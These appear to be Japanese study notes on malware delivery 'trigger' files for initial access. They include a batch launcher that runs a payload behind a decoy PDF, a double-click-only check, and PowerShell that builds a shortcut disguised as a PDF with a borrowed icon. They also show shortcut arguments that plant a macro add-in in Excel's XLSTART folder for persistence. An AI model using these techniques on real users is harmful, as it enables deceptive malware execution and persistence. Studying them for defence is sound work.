トリガーとは、ユーザコンテナを回答した後に操作するファイル
ダブルクリックだけで実行できる手間がかからないもの

## Batch
シンプルなバッチ
```cmd
@echo off
start payload.exe
start decoy.pdf
exit
```

batファイルがクリックされたか、コマンドラインから実行かを判定可能
- `%cmdcmdline%`
	- ダブルクリック時
		- 例：`C:\Windows\system32\cmd.exe /c ""C:\Users\Daniel\Desktop\test.bat""`
	- コマンドプロンプト時
		- `C:\Windows\System32\cmd.exe`
- `%~f0`
	- ダブルクリック時
		- `C:\Users\Daniel\Desktop\test.bat`
	- コマンドプロント
		- 不明

ダブルクリック時のみ起動させる
```cmd
@echo off
echo %cmdcmdline% | find /i "%~f0" || exit
calc
exit
```

## Shell link
シェルリンクとは、Windowsのショートカットを作成するためのバイナリファイル形式
エクスプローラー上では特別扱いされ、「ファイル拡張子の表示」を有効にしていても表示されない

powershellの`WScript.Shell` COMオブジェクトを使用した作成方法
```powershell
$wsh = New-Object -ComObject WScript.Shell
$lnk = $wsh.CreateShortcut("C:\Payloads\trigger.pdf.lnk")
$lnk.TargetPath = "%COMSPEC%"
$lnk.Arguments = "/C start payload.exe && start decoy.pdf"
$lnk.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,13"
$lnk.Save()
```

コンテナ内にICOファイルを依存関係として含め、それをアイコンとして使用することも可能

Excelアドイン（XLAM）をペイロードとして使用する場合、リンクの引数ではまずXLAMファイルをユーザーの `XLSTART` ディレクトリへコピーし、その後デコイのスプレッドシートを開く必要
```powershell
$lnk.Arguments = "/C xcopy /H macros.xlam %APPDATA%\Microsoft\Excel\XLSTART\ && attrib -H %APPDATA%\Microsoft\Excel\XLSTART\macros.xlam && start sales.xlsx"
$lnk.IconLocation = "%ProgramFiles%\Microsoft Office\root\Office16\EXCEL.EXE,0"
$lnk.Save()
```

